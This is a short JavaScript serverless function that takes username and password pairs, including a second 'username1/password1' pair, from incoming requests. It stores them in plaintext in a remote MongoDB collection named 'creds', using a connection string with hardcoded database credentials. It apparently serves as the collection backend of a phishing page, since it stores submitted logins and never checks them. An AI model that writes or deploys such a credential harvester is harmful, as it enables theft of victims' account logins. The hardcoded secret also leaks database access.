const { MongoClient } = require("mongodb");

const client = new MongoClient(
  "mongodb+srv://lamudi:lamudi@cluster0.cazz3.mongodb.net/auth?retryWrites=true&w=majority",
  {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  }
);

exports.handler = async function (event) {
  try {
    const auth = JSON.parse(event?.body);

    await client.connect();
    await client.db("auth").collection("creds").insertOne({
      username: auth?.username,
      password: auth?.password,
      username1: auth?.username1,
      password1: auth?.password1,
    });
  } catch (e) {
    console.log(e);
  } finally {
    await client.close();
  }
};
